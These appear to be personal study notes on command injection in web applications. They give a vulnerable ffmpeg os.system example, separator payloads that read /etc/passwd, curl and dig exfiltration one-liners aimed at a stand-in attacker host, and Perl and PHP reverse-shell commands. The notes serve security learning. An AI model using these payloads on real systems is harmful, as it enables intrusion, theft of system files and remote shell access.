# what is command injection?
- in command injection , a web application generates Bash commands, including data from a Clint, a malicious user data custom that modify the normal operation of the web application . in a short rod, unsafe user-supplied data to a system shell , The severity is commonly consider as critical issue.
- The Flow something like this
	- ![[p1.png]]
	- #### But why do web application need to interact with shell? there are many scenarios
		- Converting an image
		- Converting an videos
	    - Code example, the video_name comes from user input
        - ```os.system("/bin/ffmpeg -i {} -c:a copy -c:v vp9 -r 30 "/files/user/{}/videos".format(video_name, session.get('user_id')))```
		- Converting an external web service
		- calling a binary
# Detection phase
- the detection phase is about fuzz the suspicious input, there are some command separators, a useful can be found here
```shell
; cat /etc/passwd  
&& cat /etc/passwd  
| cat /etc/passwd  
|| cat /etc/passwd  
`cat /etc/passwd`  
$(cat /etc/passwd)  
(cat,/etc/passwd)  
cat$IFS/etc/passwd  
cat $(HOME:0:1)etc$(HOME:0:1)passwd
```
# out of band Technique
- Out-of-band technique in command injection involves the attacker's ability to **send** data outside the application's normal communication channels. This can be done through **DNS requests, HTTP requests, or other means**. The attacker can then use this channel to receive data from the exploited system, such as the output of a command executed through the command injection vulnerability. This technique can be useful when the application does not return the output of the injected command, or when the output is not easily accessible by the attacker.
# two real world example
- #### Hacked apple
	- ##### [in write up](https://samcurry.net/hacking-apple#vuln4)
# Data Exfiltration
- ## There are two types of Command Injection:
	- Normal
	- ##### Blind
		- In the normal mode, the data can be grabbed easily. However, in the blind mode, Out of Band technique should be used:
			- ##### HTTP data exfiltration
				- `curl https://attacker.tld -d "$(id)" # sending out the result of a command    
				- `curl https://attacker.tld --data-binary @/etc/passwd # sending out a file `
			- ##### DNS data Exfiltration
				- `dig a +short $(whoami).icollab.info`
				- `# in the server -> 29-May-2022 10:57:43.096 queries: info: client @0x7f47e8099f00 74.125.181.8#36381 (yasho.icollab.info): query: yash o.icollab.info IN A -E(0)DC (54.37.175.117) [ECS 91.134.231.0/24/0]`
# Reverse Shell
    
- HTTP is a stateless protocol, in the Command Injection, attackers execute commands on a non-interactive shell.
    - An interactive shell can be achieved through 2 ways:
        - Spawning a shell and binding it on a port in the target machine, connecting to it directly (nowadays is impossible, why?)
        - Using a reverse shell forcing the target machine to connect back to the attacking machine
    - Procedure:
	    - Attacker's machine listens on a port
		- Victim's machine connects to the port
		- Victim spawns a shell
		- Attacker will have the shell
    - Perl code:
        - perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
    - PHP code:
        - php -r '$sock=fsockopen("IP",PORT);exec("sh <&3 >&3 2>&3");'
# Tool
- like [[sqlmap]]